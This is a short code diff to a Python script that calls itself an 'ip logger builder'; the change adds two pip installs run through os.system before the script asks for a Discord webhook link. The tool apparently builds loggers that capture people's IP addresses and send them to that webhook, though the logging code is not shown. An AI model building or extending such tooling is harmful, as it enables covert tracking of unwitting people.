@@ -3,6 +3,8 @@ import time
 
 print("Welcome to ip logger builder!")
 time.sleep(2)
+os.system("pip install discord_webhook")
+os.system("pip install requests")
 os.system("cls")
 webhook_link = input('Enter your discord webhook link:\n')
 time.sleep(2)
